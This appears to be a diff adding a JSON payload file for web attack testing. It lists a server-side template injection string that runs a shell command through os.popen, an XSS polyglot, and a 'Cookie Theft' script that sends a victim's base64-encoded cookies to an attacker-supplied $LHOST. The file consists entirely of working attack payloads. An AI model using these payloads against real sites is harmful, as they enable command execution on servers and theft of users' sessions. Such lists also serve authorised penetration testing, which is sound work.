@@ -1,0 +1,15 @@
+{
+  "1": {
+    "name": "SSTI",
+    "data": {
+      "SSTI #1": "${self.module.cache.util.os.popen(%27id%27).read()}"
+    }
+  },
+  "2": {
+    "name": "XXS",
+    "data": {
+      "Polyglot #1": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('001337') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1337)//>\\x3e",
+      "Cookie Theft": "</textarea><script>fetch('http://$LHOST?cookie=' + btoa(document.cookie) );</script>"
+    }
+  }
+}
